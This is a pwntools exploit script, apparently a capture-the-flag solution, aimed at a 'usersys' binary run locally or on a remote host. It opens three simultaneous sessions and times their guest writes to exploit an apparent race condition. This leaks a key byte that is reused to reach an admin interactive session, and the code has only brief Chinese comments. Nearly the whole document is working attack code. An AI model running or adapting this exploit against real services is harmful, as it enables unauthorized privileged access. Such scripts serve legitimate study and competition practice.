from pwn import *
import sys

context(
    terminal = ['tmux','splitw','-h'],
    os = "linux",
    arch = "amd64",
    log_level="debug",
)

def Guest(content):
    io1.sendlineafter(b'guest]',b'guest')
    io1.sendlineafter(b'[y/n]',b'y')
    io1.sendafter(b'>>>',content)

def debug(io):
    gdb.attach(io,
'''
''')

Mode = sys.argv[1]
if Mode == 'remote':
    HOST = sys.argv[2]
    PORT = sys.argv[3]
    io1 = remote(HOST,PORT)
# 首先创建io1

if Mode == 'local':
    io1 = process("./usersys")
    # debug(io1)

io1.sendlineafter(b'guest]',b'admin')
io1.sendlineafter(b'logout]\n',b'clear')
io1.sendlineafter(b'logout]\n',b'logout')
# 清空，确保每次情况可控

Guest(b'aa')
Guest(b'aa')
Guest(b'aa')
Guest(b'aa')

io1.sendlineafter(b'guest]',b'guest')

if Mode == 'remote':
    io2 = remote(HOST,PORT)
    io3 = remote(HOST,PORT)

if Mode == 'local':
    io2 = process("./usersys")
    io3 = process("./usersys")
    # debug(io2)
    # debug(io3)

io2.sendlineafter(b'guest]',b'guest')
io3.sendlineafter(b'guest]',b'guest')
io2.recvuntil(b'[y/n]')
io3.recvuntil(b'[y/n]')
# 确保io2, io3进入位置之后, io1再继续

io1.sendlineafter(b'[y/n]',b'y')
io1.sendafter(b'>>>',b'hahaha')
io1.recvuntil(b'guest]')
# 确保io1保存并退出后, io2再继续

io2.sendline(b'y')
io2.sendafter(b'>>>',p16(10))

io2.sendlineafter(b'guest]', b'admin')
io2.sendlineafter(b'logout]\n', b'show')
print(io2.recvuntil(b'hahaha\x0a\x0b\x0a\x21\x0a'))
key = io2.recv(1)
# 确保io2保存并退出后, 继续拿key_address

io3.sendline(b'y')
io3.sendafter(b'>>>', key)

io3.sendlineafter(b'guest]',b'admin')

io3.interactive()
